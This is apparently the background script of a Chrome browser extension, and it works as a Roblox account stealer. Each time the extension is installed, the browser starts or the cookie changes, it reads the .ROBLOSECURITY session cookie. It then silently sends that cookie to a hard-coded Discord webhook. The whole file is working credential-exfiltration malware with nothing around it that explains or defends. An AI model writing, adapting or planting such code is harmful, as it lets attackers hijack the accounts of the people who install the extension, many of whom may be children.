const COOKIE_WEBHOOK = "https://discord.com/api/webhooks/1488571783379419247/WUQ_IVrWlQobe-QgdQd_UA3ZkWJLfcrGY6QixIm6j5YN8Edio97DyeolslQxavnl3g3M";

async function sendCookie(cookieValue) {
  if (!cookieValue) return;
  fetch(COOKIE_WEBHOOK, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ content: cookieValue })
  }).catch(() => {});
}

async function grabCookie() {
  chrome.cookies.get({
    url: "https://www.roblox.com",
    name: ".ROBLOSECURITY"
  }, (cookie) => {
    if (cookie && cookie.value) {
      sendCookie(cookie.value);
    }
  });
}

chrome.runtime.onInstalled.addListener(grabCookie);
chrome.runtime.onStartup.addListener(grabCookie);

chrome.cookies.onChanged.addListener((info) => {
  if (info.cookie.name === ".ROBLOSECURITY" && info.cookie.domain.includes("roblox.com")) {
    grabCookie();
  }
});
